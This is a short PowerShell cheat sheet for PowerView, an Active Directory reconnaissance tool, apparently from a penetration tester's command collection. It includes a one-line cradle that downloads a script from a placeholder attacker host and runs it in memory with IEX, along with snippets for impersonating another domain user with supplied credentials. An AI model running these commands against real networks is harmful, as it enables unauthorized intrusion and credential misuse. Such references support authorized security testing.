# powerview

% ad, windows, powerview
#plateform/windows #target/remote  #cat/RECON 

## Convert from SID
```powershell
Convert-ADName -ObjectName <sid>
```

## Convert to SID
```powershell
ConvertTo-SID -Name <name>
```

## load from remote
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
```

## Use different credentials (-Credential)
```powershell
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain_netbios>\<user>', $SecPassword)
<command> -Credential $Cred
```

## Impersonate a user
if running in -sta mode, impersonate another credential a la "runas /netonly"

Invoke-RevertToSelf to leave
```powershell
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain_netbios>\<user>', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
```





